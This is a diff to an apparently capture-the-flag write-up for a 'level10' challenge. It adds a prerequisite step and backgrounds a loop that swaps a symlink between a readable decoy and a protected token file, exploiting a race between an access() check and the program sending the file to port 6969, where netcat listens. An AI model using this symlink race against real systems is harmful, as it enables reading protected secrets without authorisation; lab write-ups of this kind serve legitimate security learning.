@@ -73,6 +73,12 @@ To increase success chances, we exploit the race condition with multiple loops.
 
 ## Exploitation Steps
 
+### prerequire
+
+```bash
+touch /tmp/myfile
+```
+
 ### Terminal 1: Listen for data
 
 The program sends the file to port 6969, so listen with netcat:
@@ -89,7 +95,7 @@ This loop continuously changes the symlink target:
 while true; do
     ln -sf /tmp/myfile /tmp/exploit
     ln -sf /home/user/level10/token /tmp/exploit
-done
+done &
 ```
 
 - `/tmp/myfile` → readable file (for `access()`)
